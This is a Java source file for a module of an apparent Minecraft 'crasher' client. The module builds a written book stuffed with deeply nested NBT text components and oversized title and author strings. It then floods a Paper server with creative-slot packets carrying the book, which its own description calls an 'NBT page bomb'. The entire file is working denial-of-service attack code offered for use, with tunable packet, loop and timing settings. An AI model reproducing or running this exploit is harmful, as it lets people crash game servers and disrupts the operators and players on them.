package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataWrittenBookContent;
import me.dannycrasher.client.protocol.components.data.impl.Filterable;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.Tag;

public class CreativeWrittenBook extends Module {
	private ScheduledExecutorService executorService;

	public CreativeWrittenBook() {
		super("CreativeWrittenBook", "Paper creative-slot written book NBT page bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 100, "50");
		addArgument("pages", ArgumentType.INT, 1, 15, "15");
		addArgument("nbtDepth", ArgumentType.INT, 1, 32, "16");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "10");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int pages = context.getInt("pages");
		int nbtDepth = context.getInt("nbtDepth");
		int slot = context.getInt("slot");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		Tag nestedPayload = buildNestedPayload(nbtDepth);
		List<Filterable<Tag>> pagesList = new ArrayList<>();
		for (int i = 0; i < pages; i++) {
			pagesList.add(new Filterable<>(nestedPayload, null));
		}

		String oversizedTitle = "A".repeat(Math.min(nbtDepth * 8, 256));
		String oversizedAuthor = "B".repeat(Math.min(nbtDepth * 8, 256));

		DataComponents components = new DataComponents();
		components.put(new DataWrittenBookContent(
				new Filterable<>(oversizedTitle, null),
				oversizedAuthor,
				0,
				pagesList,
				true
		));
		ItemStack item = new ItemStack(ItemType.WRITTEN_BOOK.getId(protocol), 1, components);

		executorService = CreativeAttackHelper.start(this, context, executorService, packets, threadSleep, loopAmount, slot, item);
	}

	private static Tag buildNestedPayload(int depth) {
		CompoundTag root = new CompoundTag();
		root.putString("text", ".");
		ListTag extras = new ListTag();
		CompoundTag current = root;
		for (int i = 0; i < depth; i++) {
			CompoundTag child = new CompoundTag();
			child.putString("text", ".");
			ListTag childExtras = new ListTag();
			extras.add(child);
			current.put("extra", extras);
			extras = childExtras;
			current = child;
		}
		return root;
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
